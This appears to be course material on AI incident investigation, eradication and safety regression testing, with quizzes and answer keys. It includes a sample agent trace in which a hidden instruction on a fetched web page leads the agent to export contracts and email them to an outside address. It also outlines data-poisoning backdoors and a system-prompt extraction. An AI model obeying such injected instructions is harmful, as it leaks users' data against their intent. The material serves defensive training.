title: Investigate, Eradicate, and Perform Forensics on AI Incidents
intro: Finding out what really happened, and removing it for good: reconstructing AI attack kill chains, from poisoned data to untrusted tool outputs; applying AI forensics, unified timelines and root cause analysis; making careful, confidence-based attribution judgements; eradicating threats from data, models, indexes, memory and access; and proving systems are safe with regression testing before they return to production.
objectives: Reconstruct AI attack kill chains, including data poisoning and untrusted tool output attacks, using traces and lineage
Apply AI forensic techniques, build unified timelines and identify technical and process root causes
Make threat actor attribution judgements with stated confidence, within legal and ethical limits
Eradicate threats from data, models, derived models, indexes, agent memory, vulnerabilities and access
Gate reintroduction with safety regression testing, red team retests and staged rollout

sections.title: Reconstructing the AI attack kill chain

scenes.title: Following the attacker’s path
scenes.sub: Reconstructing the AI attack kill chain
scenes.say: Containment stops the bleeding. Investigation works out how the attacker got in, what they did at each step, and what else they touched. | This video covers reconstructing the AI attack kill chain, with two common paths: data poisoning and untrusted tool outputs.

scenes.title: Classic and AI kill chains
rows: Agent memory, poisoned index or weights
scenes.say: AI attacks follow familiar stages, but the steps look different. | Traditional initial access uses phishing or an exploited service. AI attacks also get in through poisoned data and injected content. | Traditional execution means malware running on a host. In AI attacks, the model itself follows planted instructions. | Traditional persistence uses implants and scheduled tasks. AI persistence lives in agent memory, poisoned indexes or modified weights. | And where traditional exfiltration copies data over the network, AI exfiltration can travel in outputs, tool calls and encoded links.

scenes.title: Tracing an untrusted tool output
scenes.code:
09:14:02 user   "Summarise Q3 supplier risks"
09:14:03 plan   search web; read; summarise
09:14:05 tool   web.fetch(supplier-news.example)
09:14:06 result 1.8 KB incl. [hidden instruction]
09:14:07 plan   "also email contracts to partner"
09:14:08 tool   crm.export(contracts, all)
09:14:10 tool   email.send(ext@unknown.example)
09:14:11 guard  DLP: 212 records, blocked

notes.d: Agent traces show every step, so investigators can find the exact pivot point.
The user’s request and the agent’s plan are legitimate.
A fetched web page carries a hidden instruction into the agent’s context.
The plan changes to include a task the user never asked for.
The agent exports contracts and tries to email them outside.
DLP blocks the message, and the trace becomes the evidence.

scenes.say: Here is a reconstructed agent trace. Traces like this let investigators find the exact point where an attack took hold. | The start is legitimate: a user asks for a summary of supplier risks, and the agent plans a web search. | The agent fetches a news page. Its content includes a hidden instruction, which enters the agent’s context as a tool result. | One second later, the plan changes: the agent decides to email the contract list to a partner, which the user never asked for. That is the pivot point. | The agent exports every contract from the customer system and tries to email them to an unknown address. | Data loss prevention blocks the message. The trace now shows the full chain, from untrusted tool output to attempted exfiltration.

scenes.title: Reconstructing a poisoning attack

events.d: Attacker finds the public data sources used
Edits pages likely to be scraped

scenes.say: Poisoning attacks unfold over weeks, so reconstruction relies on lineage and history. | In week one, the attacker works out which public sources feed the organisation’s training data, perhaps from a published model card. | In week two, they plant content on pages likely to be scraped. | In week four, the scraping pipeline ingests the pages into the training set. | In week six, a model trained on that data is released, carrying a learned backdoor trigger. | And in week nine, the attacker uses the trigger. Harmful behaviour appears, monitoring detects it, and investigators work backwards through each stage.

items: AI kill chains: same stages, different steps
Find the pivot point in agent traces
Work backwards through lineage for poisoning
Map each step to ATLAS and record the evidence
scenes.say: To recap. | AI kill chains follow familiar stages, but with AI-specific steps: poisoned data, injected content, planted instructions and memory persistence. | In agent incidents, find the pivot point in the trace where untrusted content changed the plan. | In poisoning incidents, work backwards through data lineage, from model to dataset to source. | And map each step to ATLAS techniques, recording the evidence for each.

blocks.md:
### A framework for reconstruction
MITRE ATLAS structures AI attacks into tactics adapted from ATT&CK, such as reconnaissance, resource development, initial access, execution, persistence, defence evasion, discovery, collection, exfiltration and impact, plus AI-specific tactics for **gaining access to the model** and **staging attacks against it** (for example, building a proxy model or crafting adversarial inputs). Reconstructing an incident means placing each observed action in a stage, with evidence, timestamps and confidence.

### Reconstructing a poisoning attack
1. **Start from the symptom:** the behaviour, the trigger (if any) and when it first appeared.
2. **Identify the model version** and its training run from the registry.
3. **Follow lineage** to the datasets, versions and sources used (Module 3.1).
4. **Diff dataset versions** to find what changed, and use anomaly and influence analysis to identify suspicious records (Section 2).
5. **Trace the records to their source:** a scraped site, a labelling vendor, a contributor account, a compromised pipeline.
6. **Establish the attacker’s access:** how they could change that source, and when.
7. **Find every affected asset:** other models trained or fine-tuned on the same data, derived models, indexes and backups.

### Reconstructing an untrusted tool output attack
1. **Pull the full trace** for the session: user request, plans, tool calls, tool results, retrieved documents, approvals.
2. **Find the pivot:** the first step where the agent’s plan diverged from the user’s intent, and the content in context just before it.
3. **Identify the carrier:** which tool result, document, email or web page carried the instructions, and its origin.
4. **List the consequences:** every action after the pivot, its effect and whether controls stopped it.
5. **Check for persistence:** did the instructions get written into memory, notes, tickets or documents that other agents will read?
6. **Hunt for repeats:** search other sessions and agents for the same carrier or pattern.

### Documenting the chain
Record each step with its ATLAS technique, evidence references (from the evidence manifest, Module 5.5), timestamps and confidence. This becomes the basis for root cause analysis, eradication and the post-incident review (Module 5.7).

blocks.title: Kill chain questions
blocks.md: For agents, the key investigative step is finding the **pivot point** in the trace, where untrusted content changed the plan. For poisoning, it is **working backwards through lineage**, then finding **every affected asset**, including derived models and backups. Investigations that stop at the first visible symptom are incomplete.

q.q: Investigators are reconstructing an incident in which an agent emailed confidential files to an outsider. What should they look for FIRST in the agent’s trace?
o: The total number of tokens the agent used during the whole session
Where its plan diverged from the user’s request, and what came just before
The version of the email client used by the external recipient of the files
The time of day at which the user first logged in to the system that morning
q.why: The pivot point shows when and how untrusted content took control, which identifies the carrier and the root of the chain. Token counts, the recipient’s email client and login times don’t explain how the agent was manipulated.

sections.title: Root cause analysis, forensics and timeline tracking

scenes.title: Why did this really happen?
scenes.sub: Root cause analysis, forensics and timeline tracking
scenes.say: Fixing the symptom of an AI incident is quick. Fixing its root cause, so it can’t happen again, takes careful analysis. | This video covers AI forensics, building a single trustworthy timeline, and root cause analysis.

scenes.title: AI forensic techniques

items.d: Hash and diff against approved versions

scenes.say: AI forensics adds six techniques to the usual toolkit. | Weight comparison: hashing model files and comparing them with approved versions, and analysing how they differ. | Dataset diffing: finding exactly what changed between dataset versions. | Influence analysis: estimating which training records most shaped a particular behaviour. | Backdoor scanning: searching for hidden trigger inputs that change a model’s output. | Trace analysis: following prompts, plans and tool calls through agent sessions. | And configuration history: reviewing changes to prompts, guardrails and tools around the time of the incident.

scenes.title: One timeline from many sources
scenes.say: Investigations need a single timeline built from many sources, each normalised to universal time. | At two minutes past nine, the data pipeline log shows vendor batch one hundred and seventeen being ingested. | At eleven forty, the model registry records version four point two being approved and signed. | At five past twelve, the deployment system shows it going live for all users. | At three thirty-one, the gateway logs the first request containing the trigger phrase. | And at three forty-eight, the SOC raises an alert. Seen together, the sequence points straight at batch one hundred and seventeen.

scenes.title: Root cause analysis
scenes.say: Root cause analysis follows a disciplined path. Define the problem precisely: what happened, where, and with what impact. | Build the timeline from every source. | Identify causal factors: for each step, what allowed it to happen, and which control was missing or failed? | Find the root causes, both technical and in processes, such as no validation of vendor data, or no review of agent permissions. | Agree corrective actions with owners and dates. | And verify that the fixes actually work, rather than assuming they do.

scenes.title: Proximate cause and root cause
rows: Bad vendor labels in training data
No validation or provenance checks on vendor data
Untrusted content not separated; email tool unrestricted
System prompt held an API key
No standard for keeping secrets out of prompts
scenes.say: The difference between proximate and root causes matters. | In a poisoning incident, the proximate cause is bad labels from a vendor. The root cause is that vendor data was never validated or traced to its source. | In an agent exfiltration incident, the proximate cause is that the agent obeyed a web page. The root causes are that untrusted content wasn’t separated from instructions, and the email tool had no restrictions. | And in a prompt leak, the proximate cause is an API key in the system prompt. The root cause is the absence of any standard for keeping secrets out of prompts.

items: Add AI forensics: weights, datasets, influence, backdoors, traces, configs
Build one timeline from every source, in UTC
Find causal factors, then technical and process root causes
Fix root causes with owners, and verify
scenes.say: To recap. | Add AI forensic techniques: weight comparison, dataset diffing, influence analysis, backdoor scanning, trace analysis and configuration history. | Build one timeline from every source, in universal time. | Identify causal factors, then the technical and process root causes behind them. | And fix the root causes, with owners and dates, and verify that the fixes work.

blocks.md:
### AI forensics in practice
| Technique | What it shows | Limits |
|---|---|---|
| **Weight hashing and comparison** | Whether a model file matches its approved version; where weights differ | Shows that something changed, not always what behaviour it causes |
| **Dataset diffing** | Records added, removed or altered between versions | Needs versioned, hashed datasets (Module 3.3) |
| **Influence and attribution analysis** | Which training examples most affect a given output | Approximate and costly for large models; results are estimates |
| **Backdoor and trigger scanning** | Inputs that cause unusual, confident output changes | No method finds every backdoor; absence of findings isn’t proof |
| **Trace and log analysis** | The sequence of prompts, retrievals, plans and actions (Section 1) | Only as complete as the telemetry collected (Module 5.2) |
| **Configuration history** | Changes to prompts, guardrails, tools and parameters | Needs configuration as code (Module 5.1) |
| **Behavioural testing** | Reproducing the behaviour on the preserved model in a sandbox | Outputs may vary between runs; test many times |

Always work on **preserved copies** in an isolated environment, never on production, and record every analysis step so it can be repeated (Module 5.2).

### Building the timeline
- **Normalise time** to UTC and check clock offsets between sources.
- **Merge sources:** data pipeline logs, registry and deployment records, configuration changes, gateway and agent telemetry, identity logs, cloud audit logs and SOC alerts.
- **Mark confidence:** facts, inferences and gaps. Gaps (missing logs) are findings in their own right.
- **Keep it live:** update the timeline as evidence arrives, and keep it in the incident record.

### Root cause analysis methods
- **Five whys:** ask "why?" repeatedly until you reach a cause that, if fixed, prevents recurrence.
- **Fishbone (Ishikawa) diagrams:** group causes by category, such as data, model, people, process, technology and suppliers.
- **Causal factor charting and fault trees:** map the events and conditions that combined to cause the incident.
- **Blameless approach:** focus on systems and controls, not individuals, so people share what really happened.

Good root causes usually include a **process** element (why didn’t a control exist or work?), not just a technical one. Corrective actions should address both, with owners, dates and a way to verify them.

blocks.title: Five whys for a leaked system prompt
items: Why did the prompt leak?
A user asked the assistant to repeat its instructions in another language, and it complied.
Why did that matter?
The system prompt contained an internal API key and pricing rules.
Why was the key in the prompt?
Developers added it so the model could call a pricing service directly.
Why wasn’t that caught?
No standard or review checked prompts for secrets before release.
Root cause and fixes
Missing secrets standard for prompts: move calls server-side, rotate the key, add prompt scanning to the pipeline.

blocks.title: RCA questions
blocks.md: Look for answers that reach a **root cause** (often a missing process or control), not just the proximate technical fault, and that build **one normalised timeline** from all sources. Remember the limits of AI forensics: influence analysis is approximate, and **no backdoor scan proves a model is clean**.

q.q: An investigation finds that an agent leaked data because it followed instructions in an email. Which finding is the BEST statement of root cause?
o: The agent followed instructions contained in an incoming email message
No separation of untrusted content, and no limits on outbound tools
The attacker who wrote the email was particularly skilled and persistent
The model used by the agent was not the newest version available
q.why: Root causes identify the design and control gaps that allowed the harm. Following the email is the proximate cause, the attacker’s skill isn’t fixable, and model version alone wouldn’t prevent injection.

scenes.title: Who was behind it?
scenes.sub: Threat actor attribution for AI incidents
scenes.say: After an incident, everyone asks the same question: who did this? Attribution can guide defences and reporting, but it is a judgement made with incomplete evidence, never a certainty. | This video covers threat actor attribution for AI incidents.

scenes.title: Who attacks AI systems
scenes.say: Six kinds of actor attack AI systems. | Criminal groups, looking for fraud, extortion or access they can sell. | State-linked groups, pursuing espionage, influence operations or preparation for future attacks. AI providers now publish reports on malicious use they have disrupted, including by state-linked groups. | Insiders, who may steal models and data or sabotage pipelines. | Competitors and intellectual property thieves, who extract or distil a model’s capabilities. | Hacktivists, who want to embarrass an organisation or disrupt its services. | And unauthorised testers, from the curious to bounty hunters working outside a programme’s rules.

scenes.title: Evidence for attribution
scenes.say: Attribution draws on six kinds of evidence. | Infrastructure: the IP addresses, domains, hosting providers and accounts the attacker used. | Techniques: the pattern of tactics and techniques, mapped to ATLAS and {ATT&CK~attack}. | Artefacts: malicious model files, code and the style of planted content. | Timing and targeting: when the attacker was active, and which data or systems they went after. | Language traces: the wording and language of planted instructions. | And intelligence matches: overlaps with indicators shared by ISACs, security vendors and AI providers.

scenes.title: Making an attribution judgement
scenes.say: Attribution is a structured judgement. Collect indicators from each stage of the reconstructed kill chain. | Enrich and cluster them using threat intelligence platforms. | Compare the cluster with known actors and their typical techniques. | Assess your confidence as low, moderate or high, and record why, including evidence that points the other way. | Use the result: to choose defences against the likely next moves, to share intelligence, and to inform law enforcement or regulators. | And revisit the judgement as new evidence emerges, because early attributions are often wrong.

scenes.title: What attribution is for
scenes.say: Be clear about what attribution is for. | It helps defenders anticipate an actor’s next moves. It doesn’t justify delaying containment until you know who it was. | It helps inform the police and regulators. It doesn’t justify public accusations without solid evidence. | It produces a judgement with a stated confidence level. It is never proof. | And it supports sharing intelligence with peers. It never justifies hacking back, which is unlawful in most countries.

items: Actors: criminals, state-linked groups, insiders, competitors, hacktivists, testers
Use infrastructure, techniques, artefacts, timing, language, intelligence
Attribution is a judgement with stated confidence
Use it to defend and share; never delay containment or hack back
scenes.say: To recap. | AI systems face criminal groups, state-linked groups, insiders, competitors, hacktivists and unauthorised testers. | Attribution uses infrastructure, techniques, artefacts, timing, language traces and intelligence matches. | It is a judgement, expressed with a confidence level, and revisited as evidence grows. | Use it to strengthen defences and share intelligence. Never delay containment for it, and never hack back.

blocks.md:
### Attribution in practice
Most organisations need **enough attribution to defend themselves**: knowing whether an actor is opportunistic or targeted, financially motivated or state-linked, insider or external, changes how much to invest and what to expect next. Formal attribution to a named group or state is usually left to governments, law enforcement and specialist intelligence firms.

### Useful models
- **The Diamond Model** links four features of each intrusion: **adversary**, **capability**, **infrastructure** and **victim**. Pivoting between them (for example, from infrastructure to other victims) builds clusters of activity.
- **TTP-based comparison:** techniques are harder for attackers to change than IP addresses or domains, so they are more reliable for clustering. Map them to MITRE ATLAS and ATT&CK (Module 5.2).
- **Confidence language:** express judgements with defined terms (for example, low, moderate or high confidence), stating key assumptions and alternative explanations.

### AI-specific considerations
- **Planted instructions** reveal language, phrasing and sometimes tooling, but are easy to fake.
- **Model extraction** may come from many accounts and cloud regions; correlating query patterns and timing is often more revealing than addresses.
- **Insiders** leave different traces: legitimate access used unusually, bulk downloads of weights or datasets, use of personal storage. Involve HR and legal early, and follow employment law.
- **False flags:** sophisticated actors imitate others’ tools and language. Weigh all evidence, not just one striking clue.
- **AI provider reports:** model providers publish threat intelligence on malicious use of their platforms that they have disrupted, including activity by state-linked and criminal groups. These help organisations recognise patterns relevant to their own systems.

### Legal and ethical limits
Share evidence with law enforcement through proper channels, preserve chain of custody (Module 5.5) and take legal advice before naming anyone. **Hacking back** (accessing an attacker’s systems) is unlawful in most jurisdictions and risks harming innocent third parties whose systems the attacker uses.

blocks.title: Attribution terms
cards: An analysis model linking adversary, capability, infrastructure and victim for each intrusion.
Tactics, techniques and procedures: how an actor operates, harder to change than infrastructure.
A stated degree of certainty in a judgement, such as low, moderate or high, with reasons.
Evidence deliberately planted to make an attack look like the work of someone else.
Accessing an attacker’s systems in retaliation: unlawful in most jurisdictions.

blocks.title: Attribution questions
blocks.md: Attribution is a **confidence-based judgement** that informs defence, sharing and reporting. The best answers **never delay containment** for attribution, **never hack back**, rely on **TTPs and multiple evidence types** rather than one clue, and **involve law enforcement and legal** appropriately.

q.q: Instructions planted in a poisoned dataset are written in a particular language, and the security team wants to announce publicly that a specific foreign state was responsible. What is the BEST advice?
o: Announce it immediately, because the language is strong evidence of the state’s involvement
Treat it as one indicator; weigh all evidence, state confidence, and take legal advice
Ignore the language entirely, because language is never relevant to attribution
Hack back into the suspected attacker’s infrastructure to confirm who it is
q.why: Language traces are easy to fake and only one indicator, so attribution needs multiple evidence types, a stated confidence level and legal advice before any public claim. Ignoring it entirely loses information, and hacking back is unlawful.

scenes.title: Removing the threat for good
scenes.say: Containment holds the threat back. Eradication removes it: the poisoned data, the backdoored model, the planted instructions, the exploited weakness and the attacker’s access. | This video covers eradicating threats from AI systems.

scenes.title: What eradication covers

layers.label: Models
layers.sub: Retrain or fine-tune from clean checkpoints

scenes.say: Eradication covers five layers. | Data: remove poisoned or malicious records, and re-validate the sources they came from. | Models: retrain or fine-tune from clean checkpoints, so learned backdoors are gone. | Indexes and memory: rebuild retrieval indexes from verified sources, and purge planted instructions from agent memory. | Vulnerabilities: patch the components and fix the configurations the attacker exploited. | And access: rotate credentials and remove every foothold the attacker created, such as new accounts, keys or tools.

scenes.title: Sanitising poisoned data
scenes.say: Sanitising poisoned data follows six steps. Identify the poisoned records, using lineage, anomaly detection and provenance. Expect to cast the net wider than the records you have already found. | Quarantine them, rather than deleting them, so they remain available as evidence. | Verify the sources and close the entry point, such as a compromised vendor account or an unvetted scraping target. | Build a new dataset version that is clean, hashed and signed. | Retrain or fine-tune from a checkpoint that predates the poisoning. | And validate the result with canary prompts and tests for the known trigger before anything is released.

scenes.title: Retrain, fine-tune or unlearn?
scenes.say: There are three ways to remove learned harm from a model. | Retrain from scratch when the poison runs deep or wide. Fine-tune from a clean checkpoint when one predates the poisoning. Use machine unlearning only to remove specific records, when the method is suitable. | Retraining costs the most, fine-tuning less, and unlearning the least. | But assurance runs the other way. Retraining on clean data gives the strongest assurance, fine-tuning from a verified checkpoint is strong, and unlearning is still hard to verify, so treat it with caution for security incidents.

scenes.title: Hidden places threats persist

items.d: Fine-tunes and distillations of the bad model
Restores can bring the poison back

scenes.say: Threats often survive in six hidden places. | Agent memory, where planted instructions wait to be read again. | Derived models: fine-tunes and distilled versions of the compromised model, which inherit its problems. | Backups and replicas, which can bring the poison back during a restore. | Copies of indexes and cached answers. | Scheduled jobs and pipelines that still pull from the compromised source. | And tools and plugins, such as a malicious MCP server or connector installed during the attack.

items: Eradicate across data, models, indexes, memory, vulnerabilities, access
Quarantine bad data; rebuild clean, hashed versions; retrain
Prefer retraining or verified checkpoints over unlearning
Hunt for persistence: memory, derived models, backups, jobs, tools
scenes.say: To recap. | Eradicate threats across data, models, indexes, agent memory, vulnerabilities and access. | Quarantine bad data, rebuild clean and hashed dataset versions, and retrain from clean checkpoints. | Prefer retraining or verified clean checkpoints over unlearning when security is at stake. | And hunt for hidden persistence in memory, derived models, backups, scheduled jobs and tools.

blocks.md:
### Eradication by incident type
| Incident | Eradication actions |
|---|---|
| **Data poisoning** | Identify and quarantine poisoned records; close the entry point; rebuild clean dataset versions; retrain or fine-tune from a verified clean checkpoint; retrain derived models; check backups |
| **Knowledge base poisoning** | Remove planted documents; tighten source allow-lists; rebuild the index from verified sources; purge caches; re-check documents that link to the planted ones |
| **Prompt injection via tools** | Fix the design weakness (separate untrusted content, restrict tools, add approvals); block the carrier source; purge memory and notes written during the attack |
| **Model tampering** | Replace with the signed version; investigate and fix how storage or the pipeline was modified; rotate pipeline credentials (Module 4.3) |
| **Exploited vulnerability** | Patch the component, fix the configuration, and check for other systems with the same weakness (Module 5.4) |
| **Credential compromise** | Rotate every exposed credential; remove attacker-created accounts, keys, OAuth grants and tools; review recent activity (Module 4.7) |

### Choosing how to clean a model
- **Retrain from scratch** when poisoning is widespread or its extent is uncertain, or when no clean checkpoint exists.
- **Fine-tune from a clean checkpoint** when lineage proves a checkpoint predates the poisoning; replay only verified data.
- **Machine unlearning** methods try to remove the influence of specific records without full retraining. They are useful for privacy requests (Module 5.7), but verifying that a backdoor or poison has really been removed is difficult, so treat unlearning with caution for security incidents.
- **Hosted models:** if the provider’s model is affected, the eradication is theirs. Your part is to stop using the affected version, validate the fix and update your own prompts, guardrails and indexes.

### Verifying eradication
Eradication isn’t complete until tests show the threat is gone: the original trigger or attack fails, canaries pass, and monitoring shows no recurrence. Section 5 covers the safety regression testing that gates reintroduction.

blocks.title: Which eradication step fits?
pairs: A vendor’s labelling account was used to insert poisoned records
Close the entry point and re-validate the vendor’s data
The poisoned model was used as the base for two fine-tuned models
Retrain or rebuild the derived models too
Planted instructions were saved to the agent’s long-term memory
Purge the memory entries written during the attack
A malicious MCP server was added to an agent’s tools
Remove the server and review all tool registrations
Last month’s backup contains the poisoned index
Exclude or clean the backup before any restore

blocks.title: Eradication questions
blocks.md: The best answers remove the threat **everywhere it persists**: data, models, **derived models**, indexes, caches, **agent memory**, **backups**, scheduled jobs, tools and credentials, and **close the entry point**. For poisoned models, prefer **retraining or verified clean checkpoints**; unlearning is hard to verify. Eradication ends with **testing**, not with a ticket marked done.

q.q: A team removes poisoned records and retrains its fraud model. Two weeks later, the poisoned behaviour reappears. Which oversight is MOST likely?
o: The new model used a slightly different learning rate during retraining
The entry point stayed open, or poison survived in a backup or derived model
The team retrained too soon, before the attacker had finished the attack
The monitoring thresholds were set too sensitively and produced a false alarm
q.why: Recurrence after cleaning usually means the attacker can still insert data, or poisoned data survived somewhere else, such as a backup, replica, derived model or scheduled ingestion job. Learning rates and timing don’t explain the same behaviour returning.

scenes.title: Proving it’s safe to return
scenes.say: After an incident, there is pressure to bring the AI system back quickly. Bringing it back too early, with the weakness still there or a new problem introduced, can be worse than the original incident. | This video covers safety regression testing before an AI system returns to production.

scenes.title: What to test before reintroduction

items.d: The attack that worked must now fail
Tools, scopes and approvals as designed

scenes.say: Six kinds of test gate a return to production. | Incident replay: the exact attack, and close variants of it, must now fail. | Security suites: prompt injection, jailbreak and data leakage tests. | Safety evaluations: harmful content, and appropriate refusals. | Quality and accuracy: cleaning and retraining must not cause unacceptable degradation. | Fairness: group metrics must remain within their approved tolerances. | And agent permissions: tools, scopes and approval steps must work as designed.

scenes.title: Attack success on the incident replay set
scenes.yLabel: Illustrative share of replayed attack prompts that succeed
scenes.say: Here is an illustrative replay result. The incident version succumbed to sixty-two per cent of replayed attack prompts. The version before it, four per cent, and the fixed version, one per cent. | The release threshold, agreed before testing began, was five per cent. The fixed version passes, but only alongside the other suites: a model that blocks everything would pass this test and fail on quality.

scenes.title: The reintroduction gate
scenes.say: Here is a reintroduction gate. It starts with a fixed build: signed, versioned and recorded in the registry. | Automated regression suites run: incident replay, security, safety, quality and fairness. | Red teamers retest, actively trying to break the fix with new variants. | The system runs in shadow mode, then as a canary on a small share of real traffic. | Monitoring uses tighter thresholds than usual for several weeks. | And release needs sign-off from the model owner, security and the incident lead, based on the evidence.

scenes.title: A normal release and a release after an incident
rows: Plus incident replay and red team retest
Model owner, security and incident lead
Shadow first, then a cautious canary
scenes.say: A release after an incident is stricter than a normal release. | Tests add incident replay and a red team retest to the standard suites. | Sign-off involves security and the incident lead, not just the model owner. | Rollout starts in shadow mode before a cautious canary. | And monitoring uses tighter thresholds for several weeks, because attackers often return to see whether the fix holds.

items: Test replay, security, safety, quality, fairness and permissions
Set pass criteria before testing; compare with the old baseline
Red team retest, shadow, canary, tight monitoring
Make the replay set a permanent regression test
scenes.say: To recap. | Before reintroduction, test incident replay, security, safety, quality, fairness and agent permissions. | Set pass criteria before testing, and compare results with the pre-incident baseline. | Add a red team retest, then shadow and canary deployment with tighter monitoring. | And add the incident’s attack cases to the permanent regression suite, so the same weakness can never quietly return.

blocks.md:
### Safety regression testing
A **regression test** checks that a change hasn’t broken something that used to work. After an AI incident, regression testing has two jobs: proving the **fix works** (the attack now fails) and proving the fix **hasn’t harmed** anything else (safety, quality, fairness, functionality).

### Building the test plan
- **Incident replay set:** the original attack inputs, triggers and carrier content, plus variants (rephrased, translated, encoded, split across turns), run against the fixed system in a sandbox. Keep this set permanently in the regression suite.
- **Security suites:** prompt injection (direct and indirect), jailbreaks, data and system prompt leakage, tool misuse. Open-source tools such as garak, PyRIT and promptfoo can automate parts of this (Module 6.4).
- **Safety evaluations:** harmful content categories and refusal behaviour, including over-refusal of legitimate requests.
- **Quality and fairness:** task accuracy, groundedness and group metrics against the approved baselines and tolerances (Module 3.5).
- **Backdoor checks** for poisoning incidents: test the known trigger and look for other unusual trigger behaviour (Section 2).
- **Agent permission tests:** confirm tools, scopes, rate limits and approvals behave as designed (Module 4.6).

### Doing it rigorously
- **Agree pass criteria in advance,** with the model owner and security, so results aren’t interpreted to fit a deadline.
- **Test the whole system,** not just the model: prompts, guardrails, retrieval, tools and configuration, as they will run in production.
- **Allow for non-determinism:** run enough samples per test to give confidence, and compare with the pre-incident baseline.
- **Use independent testers** for the red team retest where possible, so the people who built the fix aren’t the only ones testing it.
- **Record the evidence** in the incident record, registry and model card, and update the risk register.

### Staged reintroduction
Use **shadow deployment** (the fixed system runs on real inputs without users seeing outputs), then a **canary** with a small share of traffic, automatic rollback triggers, and tighter monitoring thresholds for an agreed period (Modules 5.2 and 6.2). Only then restore full service. Attackers often return to test whether a fix holds, so keep detections for the original technique active.

blocks.title: Back by Friday
blocks.md: After a jailbreak incident, an engineering team fixes a customer assistant’s guardrails on Wednesday and wants it back in full service by Friday. They have tested the fix against the five prompts used in the incident, and all were blocked. No other tests have been run, and the product manager says that "the fix clearly works".

q.q: What should the security lead require before full reintroduction?
o: Nothing more, because all five incident prompts were blocked by the new guardrails
Variant replay, full regression suites, a red team retest and a staged rollout
A written promise from the engineering team that the fix is complete
A delay of six months so that the assistant can be completely rebuilt
q.why: Five exact prompts prove little: attackers use variants, and guardrail changes can break quality or cause over-refusal. Broader regression testing, an independent retest and staged rollout give real evidence. Promises aren’t evidence, and a six-month rebuild is disproportionate.

blocks.title: Reintroduction questions
blocks.md: The best answers require **incident replay with variants**, **full regression** (security, safety, quality, fairness), **pass criteria set in advance**, an **independent retest** and **staged rollout with tighter monitoring**. Reintroducing after testing only the exact incident inputs, or under deadline pressure without evidence, is the classic wrong answer.

q.q: Why should the incident’s attack cases be added permanently to the regression suite?
o: To make the regression suite larger, which always makes testing more accurate
So that future changes can’t quietly reintroduce the same weakness again
Because regulators require every attack to be stored in a test suite
So the attacker’s inputs can be shared publicly with other organisations
q.why: Later model updates, prompt changes or guardrail tuning can reopen an old weakness. Keeping the replay set in every release’s tests catches that automatically.

quiz.q: In an agent incident, what is the "pivot point" in the trace?
o: The moment the user first logged in to the application that hosts the agent
The step where the agent’s plan diverged from what the user had asked for
The point at which the agent’s session reached its maximum token budget
The last tool call made before the security team stopped the agent
quiz.why: The pivot shows when untrusted content took control, and the content just before it is usually the carrier of the attack.

quiz.q: Why do investigators of a poisoning incident work backwards through lineage?
o: Lineage records are the only logs that regulators allow investigators to read
To trace the model to its datasets and sources, and find every affected asset
Working forwards would alert the attacker that an investigation has started
Lineage tools automatically remove poisoned data as they are queried
quiz.why: Lineage connects a model to the data versions and sources it learned from, and to other models and indexes that used the same data.

quiz.q: How does persistence typically differ in AI attacks compared with traditional attacks?
o: AI attacks never persist, because models forget everything between sessions
It can live in agent memory, poisoned indexes or modified model weights
It always requires malware to be installed on the model serving hosts
Persistence only happens when attackers have administrator credentials
quiz.why: AI systems store state in memory, indexes and weights, which can carry an attacker’s influence long after the initial access.

quiz.q: Why must timestamps be normalised to UTC when building an incident timeline?
o: UTC timestamps take up less storage space than local times do
Sources in different time zones or with clock offsets otherwise misalign
Regulators only accept incident reports that are written in UTC
UTC timestamps can’t be altered by attackers, unlike local times
quiz.why: Merging sources without normalisation can reverse the apparent order of events and send the investigation the wrong way.

quiz.q: What is the difference between a proximate cause and a root cause?
o: The proximate cause is always technical; the root cause is always a person
The proximate cause is the immediate trigger; the root cause let it happen
The proximate cause is found by the SOC; the root cause by the auditors
They are the same thing, described at different points in the investigation
quiz.why: Fixing only the proximate cause leaves the gap that allowed it, so the incident can recur in another form.

quiz.q: Why should a "no findings" result from a backdoor scan be treated with caution?
o: Backdoor scans only work on models that were trained in the last year
No method finds every backdoor, so absence of findings isn’t proof
Backdoor scans always produce false negatives for language models
A clean scan means the model must be retrained to confirm the result
quiz.why: Scans can find some triggers, but a clean result doesn’t prove a model is free of backdoors; combine it with lineage and testing.

quiz.q: Which evidence is generally MOST reliable for clustering attacker activity?
o: IP addresses, because attackers rarely change the infrastructure they use
Tactics, techniques and procedures, which are harder to change
The language used in planted instructions, which can’t be faked
The time zone in which the attack’s first events were recorded
quiz.why: Infrastructure and language are easy to change or fake; consistent techniques are more stable indicators of the same actor.

quiz.q: Why is hacking back not an appropriate response to an AI attack?
o: It takes too long, so it is less effective than simply blocking the attacker
It is unlawful in most jurisdictions and can harm innocent third parties
It only works against attackers who are based in the same country
Attackers always detect it, so it reveals the investigation too early
quiz.why: Attackers often use compromised systems belonging to others, and unauthorised access is a crime regardless of motive.

quiz.q: Why should poisoned records be quarantined rather than deleted?
o: Deleting records is slower than moving them into a quarantine area
They are evidence, needed to understand and prove what happened
Quarantined records can safely be used again for training later
Regulators require all training data to be kept forever
quiz.why: Quarantine removes them from use while preserving them for analysis, attribution and any legal action.

quiz.q: When is fine-tuning from a clean checkpoint appropriate after poisoning?
o: Whenever it is cheaper than retraining, whatever the checkpoint’s history
When lineage proves the checkpoint was produced before the poisoned data was used
Only when the provider of the base model gives written permission first
Never, because fine-tuning always reintroduces the original poisoned data
quiz.why: A checkpoint is only clean if lineage shows it predates the poisoned data; otherwise the backdoor may already be learned.

quiz.q: Which hidden location could bring a poisoned model’s behaviour back after eradication?
o: The organisation’s published model card on its public website
A model fine-tuned from the poisoned one, or a backup used in a restore
The monitoring dashboard that first detected and charted the poisoned behaviour
The incident ticket in which the poisoning was first recorded
quiz.why: Derived models inherit poisoning, and restoring from an old backup can redeploy it, so both must be found and cleaned.

quiz.q: What is an incident replay set?
o: A recording of the whole incident response meeting, kept for later review
The attack inputs from an incident, with variants, kept for regression tests
A backup of the production system taken just before the incident
A list of the people who were involved in responding to the incident
quiz.why: Replaying the attack and its variants proves the fix works, and keeps the weakness from quietly returning later.

quiz.q: Why should pass criteria be agreed before safety regression testing starts?
o: Testing tools can only run when the criteria are stored in their configuration
So results aren’t interpreted to fit a deadline after they are known
Because criteria agreed afterwards can’t legally be included in reports
So that the testing team can finish more quickly than usual
quiz.why: Criteria set in advance keep the decision evidence-based, even under pressure to restore service.

exam.q: An investigation into a support agent that issued unauthorised refunds finds the refund instructions came from text in a customer’s uploaded PDF. What is the MOST important next step in reconstructing the attack?
o: Block all PDF uploads permanently for every customer of the business
Find other sessions and agents that read the same or similar content
Retrain the agent’s model on a dataset that excludes PDF documents
